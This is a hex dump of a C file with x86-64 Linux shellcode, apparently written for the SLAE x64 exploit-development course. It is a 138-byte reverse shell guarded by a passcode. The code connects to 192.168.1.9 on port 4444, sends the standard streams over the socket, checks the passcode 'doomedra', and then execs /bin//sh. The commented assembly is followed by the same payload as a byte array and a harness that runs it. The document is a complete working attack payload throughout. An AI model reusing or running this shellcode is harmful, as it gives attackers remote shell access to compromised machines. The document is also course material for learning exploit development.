00000000  2f 2a 0a 3b 20 41 75 74  68 6f 72 20 41 6e 64 72  |/*.; Author Andr|
00000010  69 79 20 42 72 75 6b 68  6f 76 65 74 73 6b 79 79  |iy Brukhovetskyy|
00000020  20 2d 20 64 6f 6f 6d 65  64 72 61 76 65 6e 20 2d  | - doomedraven -|
00000030  20 53 4c 41 45 78 36 34  20 31 33 32 32 0a 3b 20  | SLAEx64 1322.; |
00000040  31 33 38 20 62 79 74 65  73 0a 67 6c 6f 62 61 6c  |138 bytes.global|
00000050  20 5f 73 74 61 72 74 0a  73 65 63 74 69 6f 6e 20  | _start.section |
00000060  2e 74 65 78 74 0a 5f 73  74 61 72 74 3a 0a 0a 20  |.text._start:.. |
00000070  20 20 3b 73 6f 63 6b 65  74 20 73 79 73 63 61 6c  |  ;socket syscal|
00000080  6c 0a 20 20 20 70 75 73  68 20 62 79 74 65 20 30  |l.   push byte 0|
00000090  78 32 39 20 3b 20 34 31  20 73 6f 63 6b 65 74 20  |x29 ; 41 socket |
000000a0  0a 20 20 20 70 6f 70 20  72 61 78 20 20 20 20 0a  |.   pop rax    .|
000000b0  20 20 20 70 75 73 68 20  62 79 74 65 20 30 78 32  |   push byte 0x2|
000000c0  20 3b 20 41 46 5f 49 4e  45 54 0a 20 20 20 70 6f  | ; AF_INET.   po|
000000d0  70 20 72 64 69 20 20 0a  20 20 20 70 75 73 68 20  |p rdi  .   push |
000000e0  62 79 74 65 20 30 78 31  20 3b 20 53 4f 43 4b 5f  |byte 0x1 ; SOCK_|
000000f0  53 54 52 45 41 4d 0a 20  20 20 70 6f 70 20 72 73  |STREAM.   pop rs|
00000100  69 20 20 20 20 0a 20 20  20 63 64 71 20 3b 72 64  |i    .   cdq ;rd|
00000110  78 20 3d 20 30 20 2d 20  41 4e 59 0a 20 20 20 73  |x = 0 - ANY.   s|
00000120  79 73 63 61 6c 6c 0a 20  20 20 0a 20 20 20 78 63  |yscall.   .   xc|
00000130  68 67 20 72 64 69 2c 20  72 61 78 20 3b 20 73 61  |hg rdi, rax ; sa|
00000140  76 65 20 73 6f 63 6b 65  74 20 64 65 73 63 72 69  |ve socket descri|
00000150  70 74 6f 72 0a 20 20 20  0a 20 20 20 6d 6f 76 20  |ptor.   .   mov |
00000160  64 77 6f 72 64 20 5b 72  73 70 2d 34 5d 2c 20 30  |dword [rsp-4], 0|
00000170  78 30 39 30 31 61 38 63  30 20 3b 20 69 70 0a 20  |x0901a8c0 ; ip. |
00000180  20 20 6d 6f 76 20 77 6f  72 64 20 5b 72 73 70 2d  |  mov word [rsp-|
00000190  36 5d 2c 20 30 78 35 63  31 31 20 20 20 20 20 20  |6], 0x5c11      |
000001a0  3b 20 70 6f 72 74 20 34  34 34 34 0a 20 20 20 6d  |; port 4444.   m|
000001b0  6f 76 20 62 79 74 65 20  5b 72 73 70 2d 38 5d 2c  |ov byte [rsp-8],|
000001c0  20 30 78 30 32 0a 20 20  20 73 75 62 20 72 73 70  | 0x02.   sub rsp|
000001d0  2c 20 38 0a 20 20 20 0a  20 20 20 70 75 73 68 20  |, 8.   .   push |
000001e0  62 79 74 65 20 30 78 32  61 20 3b 20 63 6f 6e 6e  |byte 0x2a ; conn|
000001f0  65 63 74 0a 20 20 20 70  6f 70 20 72 61 78 0a 20  |ect.   pop rax. |
00000200  20 20 6d 6f 76 20 72 73  69 2c 20 72 73 70 20 20  |  mov rsi, rsp  |
00000210  20 3b 20 70 6f 69 6e 74  65 72 20 20 20 20 0a 20  | ; pointer    . |
00000220  20 20 70 75 73 68 20 62  79 74 65 20 30 78 31 30  |  push byte 0x10|
00000230  20 3b 20 6c 65 6e 0a 20  20 20 70 6f 70 20 72 64  | ; len.   pop rd|
00000240  78 0a 20 20 20 73 79 73  63 61 6c 6c 0a 0a 20 20  |x.   syscall..  |
00000250  20 70 75 73 68 20 62 79  74 65 20 30 78 33 3b 20  | push byte 0x3; |
00000260  63 6f 75 6e 74 65 72 20  0a 20 20 20 70 6f 70 20  |counter .   pop |
00000270  72 73 69 0a 0a 64 75 70  32 5f 6c 6f 6f 70 3a 0a  |rsi..dup2_loop:.|
00000280  20 20 20 64 65 63 20 72  73 69 0a 20 20 20 70 75  |   dec rsi.   pu|
00000290  73 68 20 62 79 74 65 20  30 78 32 31 0a 20 20 20  |sh byte 0x21.   |
000002a0  70 6f 70 20 72 61 78 0a  20 20 20 73 79 73 63 61  |pop rax.   sysca|
000002b0  6c 6c 0a 20 20 20 6a 6e  7a 20 64 75 70 32 5f 6c  |ll.   jnz dup2_l|
000002c0  6f 6f 70 20 3b 20 6a 75  6d 70 20 69 66 20 6e 6f  |oop ; jump if no|
000002d0  74 20 30 0a 0a 20 20 20  3b 72 65 61 64 20 62 75  |t 0..   ;read bu|
000002e0  66 66 65 72 0a 20 20 20  6d 6f 76 20 72 64 69 2c  |ffer.   mov rdi,|
000002f0  20 72 61 78 20 3b 20 73  6f 63 6b 65 74 0a 20 20  | rax ; socket.  |
00000300  20 3b 78 6f 72 20 72 61  78 2c 20 72 61 78 0a 20  | ;xor rax, rax. |
00000310  20 20 63 64 71 0a 20 20  20 6d 6f 76 20 62 79 74  |  cdq.   mov byt|
00000320  65 20 5b 72 73 70 2d 31  5d 2c 20 61 6c 20 3b 30  |e [rsp-1], al ;0|
00000330  20 72 65 61 64 0a 20 20  20 73 75 62 20 72 73 70  | read.   sub rsp|
00000340  2c 20 31 0a 20 20 20 20  20 20 20 20 20 0a 20 20  |, 1.         .  |
00000350  20 70 75 73 68 20 72 64  78 20 0a 20 20 20 6c 65  | push rdx .   le|
00000360  61 20 72 73 69 2c 20 5b  72 73 70 2d 30 78 31 30  |a rsi, [rsp-0x10|
00000370  5d 20 3b 20 31 36 20 62  79 74 65 73 20 66 72 6f  |] ; 16 bytes fro|
00000380  6d 20 62 75 66 0a 20 20  20 61 64 64 20 64 6c 2c  |m buf.   add dl,|
00000390  20 30 78 31 30 20 20 20  20 20 20 20 20 3b 20 73  | 0x10        ; s|
000003a0  69 7a 65 5f 74 20 63 6f  75 6e 74 0a 20 20 20 73  |ize_t count.   s|
000003b0  79 73 63 61 6c 6c 0a 20  20 20 0a 20 20 20 3b 74  |yscall.   .   ;t|
000003c0  65 73 74 20 70 61 73 73  63 6f 64 65 0a 20 20 20  |est passcode.   |
000003d0  6d 6f 76 20 72 61 78 2c  20 30 78 36 31 37 32 36  |mov rax, 0x61726|
000003e0  34 36 35 36 64 36 66 36  66 36 34 20 3b 20 70 61  |4656d6f6f64 ; pa|
000003f0  73 73 63 6f 64 65 20 27  64 6f 6f 6d 65 64 72 61  |sscode 'doomedra|
00000400  27 5b 3a 3a 2d 31 5d 2e  65 6e 63 6f 64 65 28 27  |'[::-1].encode('|
00000410  68 65 78 27 29 0a 20 20  20 70 75 73 68 20 72 64  |hex').   push rd|
00000420  69 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |i               |
00000430  20 20 20 20 20 3b 20 73  61 76 65 20 74 68 65 20  |     ; save the |
00000440  73 6f 63 6b 65 74 0a 20  20 20 6c 65 61 20 72 64  |socket.   lea rd|
00000450  69 2c 20 5b 72 73 69 5d  20 20 20 20 20 20 20 20  |i, [rsi]        |
00000460  20 20 20 20 20 20 3b 20  6c 6f 61 64 20 73 74 72  |      ; load str|
00000470  69 6e 67 20 66 72 6f 6d  20 61 64 64 72 65 73 73  |ing from address|
00000480  0a 20 20 20 73 63 61 73  71 20 20 20 20 20 20 20  |.   scasq       |
00000490  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000004a0  3b 20 63 6f 6d 70 61 72  65 0a 20 20 20 6a 7a 20  |; compare.   jz |
000004b0  61 63 63 65 70 74 65 64  5f 70 61 73 73 77 64 20  |accepted_passwd |
000004c0  20 20 20 20 20 20 20 20  20 3b 20 6a 75 6d 70 20  |         ; jump |
000004d0  69 66 20 65 71 75 61 6c  0a 20 20 20 0a 20 20 20  |if equal.   .   |
000004e0  3b 65 78 69 74 20 69 66  20 64 69 66 66 65 72 65  |;exit if differe|
000004f0  6e 74 20 3a 50 0a 20 20  20 70 75 73 68 20 62 79  |nt :P.   push by|
00000500  74 65 20 30 78 33 63 20  0a 20 20 20 70 6f 70 20  |te 0x3c .   pop |
00000510  72 61 78 0a 20 20 20 73  79 73 63 61 6c 6c 0a 0a  |rax.   syscall..|
00000520  61 63 63 65 70 74 65 64  5f 70 61 73 73 77 64 3a  |accepted_passwd:|
00000530  0a 20 20 20 0a 20 20 20  3b 65 78 65 63 76 65 0a  |.   .   ;execve.|
00000540  20 20 20 70 6f 70 20 72  64 69 3b 20 73 6f 63 6b  |   pop rdi; sock|
00000550  65 74 0a 20 20 20 78 6f  72 20 72 61 78 2c 20 72  |et.   xor rax, r|
00000560  61 78 0a 20 20 20 6d 6f  76 20 72 62 78 2c 20 30  |ax.   mov rbx, 0|
00000570  78 36 38 37 33 32 66 32  66 36 65 36 39 36 32 32  |x68732f2f6e69622|
00000580  66 20 3b 2f 62 69 6e 2f  2f 73 68 20 69 6e 20 72  |f ;/bin//sh in r|
00000590  65 76 65 72 73 65 0a 20  20 20 70 75 73 68 20 72  |everse.   push r|
000005a0  62 78 0a 20 20 20 6d 6f  76 20 72 64 69 2c 20 72  |bx.   mov rdi, r|
000005b0  73 70 0a 20 20 20 70 75  73 68 20 72 61 78 0a 20  |sp.   push rax. |
000005c0  20 20 6d 6f 76 20 72 64  78 2c 20 72 73 70 0a 20  |  mov rdx, rsp. |
000005d0  20 20 70 75 73 68 20 72  64 69 20 0a 20 20 20 6d  |  push rdi .   m|
000005e0  6f 76 20 72 73 69 2c 20  72 73 70 0a 20 20 20 61  |ov rsi, rsp.   a|
000005f0  64 64 20 61 6c 2c 20 30  78 33 62 0a 20 20 20 73  |dd al, 0x3b.   s|
00000600  79 73 63 61 6c 6c 0a 2a  2f 0a 0a 23 69 6e 63 6c  |yscall.*/..#incl|
00000610  75 64 65 20 3c 73 74 64  69 6f 2e 68 3e 0a 23 69  |ude <stdio.h>.#i|
00000620  6e 63 6c 75 64 65 20 3c  73 74 72 69 6e 67 2e 68  |nclude <string.h|
00000630  3e 0a 0a 2f 2f 20 31 33  38 20 62 79 74 65 73 20  |>..// 138 bytes |
00000640  0a 75 6e 73 69 67 6e 65  64 20 63 68 61 72 20 63  |.unsigned char c|
00000650  6f 64 65 5b 5d 20 3d 5c  0a 22 5c 78 36 61 5c 78  |ode[] =\."\x6a\x|
00000660  32 39 5c 78 35 38 5c 78  36 61 5c 78 30 32 5c 78  |29\x58\x6a\x02\x|
00000670  35 66 5c 78 36 61 5c 78  30 31 5c 78 35 65 5c 78  |5f\x6a\x01\x5e\x|
00000680  39 39 5c 78 30 66 5c 78  30 35 22 0a 22 5c 78 34  |99\x0f\x05"."\x4|
00000690  38 5c 78 39 37 5c 78 63  37 5c 78 34 34 5c 78 32  |8\x97\xc7\x44\x2|
000006a0  34 5c 78 66 63 22 0a 22  5c 78 63 30 5c 78 61 38  |4\xfc"."\xc0\xa8|
000006b0  5c 78 30 31 5c 78 30 39  5c 78 36 36 5c 78 63 37  |\x01\x09\x66\xc7|
000006c0  5c 78 34 34 5c 78 32 34  5c 78 66 61 22 0a 22 5c  |\x44\x24\xfa"."\|
000006d0  78 31 31 5c 78 35 63 22  20 2f 2f 70 6f 72 74 20  |x11\x5c" //port |
000006e0  62 69 67 20 65 6e 64 69  61 6e 74 0a 22 5c 78 63  |big endiant."\xc|
000006f0  36 5c 78 34 34 5c 78 32  34 5c 78 66 38 5c 78 30  |6\x44\x24\xf8\x0|
00000700  32 5c 78 34 38 5c 78 38  33 22 0a 22 5c 78 65 63  |2\x48\x83"."\xec|
00000710  5c 78 30 38 5c 78 36 61  5c 78 32 61 5c 78 35 38  |\x08\x6a\x2a\x58|
00000720  5c 78 34 38 5c 78 38 39  5c 78 65 36 5c 78 36 61  |\x48\x89\xe6\x6a|
00000730  5c 78 31 30 5c 78 35 61  5c 78 30 66 22 0a 22 5c  |\x10\x5a\x0f"."\|
00000740  78 30 35 5c 78 36 61 5c  78 30 33 5c 78 35 65 5c  |x05\x6a\x03\x5e\|
00000750  78 34 38 5c 78 66 66 5c  78 63 65 5c 78 36 61 5c  |x48\xff\xce\x6a\|
00000760  78 32 31 5c 78 35 38 5c  78 30 66 5c 78 30 35 22  |x21\x58\x0f\x05"|
00000770  0a 22 5c 78 37 35 5c 78  66 36 5c 78 34 38 5c 78  |."\x75\xf6\x48\x|
00000780  38 39 5c 78 63 37 5c 78  39 39 5c 78 38 38 5c 78  |89\xc7\x99\x88\x|
00000790  34 34 5c 78 32 34 5c 78  66 66 5c 78 34 38 5c 78  |44\x24\xff\x48\x|
000007a0  38 33 22 0a 22 5c 78 65  63 5c 78 30 31 5c 78 35  |83"."\xec\x01\x5|
000007b0  32 5c 78 34 38 5c 78 38  64 5c 78 37 34 5c 78 32  |2\x48\x8d\x74\x2|
000007c0  34 5c 78 66 30 5c 78 38  30 5c 78 63 32 5c 78 31  |4\xf0\x80\xc2\x1|
000007d0  30 5c 78 30 66 22 0a 22  5c 78 30 35 5c 78 34 38  |0\x0f"."\x05\x48|
000007e0  5c 78 62 38 5c 78 36 34  5c 78 36 66 5c 78 36 66  |\xb8\x64\x6f\x6f|
000007f0  5c 78 36 64 5c 78 36 35  5c 78 36 34 5c 78 37 32  |\x6d\x65\x64\x72|
00000800  5c 78 36 31 5c 78 35 37  22 0a 22 5c 78 34 38 5c  |\x61\x57"."\x48\|
00000810  78 38 64 5c 78 33 65 5c  78 34 38 5c 78 61 66 5c  |x8d\x3e\x48\xaf\|
00000820  78 37 34 5c 78 30 35 5c  78 36 61 5c 78 33 63 5c  |x74\x05\x6a\x3c\|
00000830  78 35 38 5c 78 30 66 5c  78 30 35 22 0a 22 5c 78  |x58\x0f\x05"."\x|
00000840  35 66 5c 78 34 38 5c 78  33 31 5c 78 63 30 5c 78  |5f\x48\x31\xc0\x|
00000850  34 38 5c 78 62 62 5c 78  32 66 5c 78 36 32 5c 78  |48\xbb\x2f\x62\x|
00000860  36 39 5c 78 36 65 5c 78  32 66 5c 78 32 66 22 0a  |69\x6e\x2f\x2f".|
00000870  22 5c 78 37 33 5c 78 36  38 5c 78 35 33 5c 78 34  |"\x73\x68\x53\x4|
00000880  38 5c 78 38 39 5c 78 65  37 5c 78 35 30 5c 78 34  |8\x89\xe7\x50\x4|
00000890  38 5c 78 38 39 5c 78 65  32 5c 78 35 37 5c 78 34  |8\x89\xe2\x57\x4|
000008a0  38 22 0a 22 5c 78 38 39  5c 78 65 36 5c 78 30 34  |8"."\x89\xe6\x04|
000008b0  5c 78 33 62 5c 78 30 66  5c 78 30 35 22 3b 0a 0a  |\x3b\x0f\x05";..|
000008c0  6d 61 69 6e 28 29 0a 7b  0a 20 20 20 70 72 69 6e  |main().{.   prin|
000008d0  74 66 28 22 53 68 65 6c  6c 63 6f 64 65 20 4c 65  |tf("Shellcode Le|
000008e0  6e 67 74 68 3a 20 25 64  5c 6e 22 2c 20 28 69 6e  |ngth: %d\n", (in|
000008f0  74 29 73 74 72 6c 65 6e  28 63 6f 64 65 29 29 3b  |t)strlen(code));|
00000900  0a 20 20 20 69 6e 74 20  28 2a 72 65 74 29 28 29  |.   int (*ret)()|
00000910  20 3d 20 28 69 6e 74 28  2a 29 28 29 29 63 6f 64  | = (int(*)())cod|
00000920  65 3b 0a 20 20 20 72 65  74 28 29 3b 0a 7d        |e;.   ret();.}|
0000092e
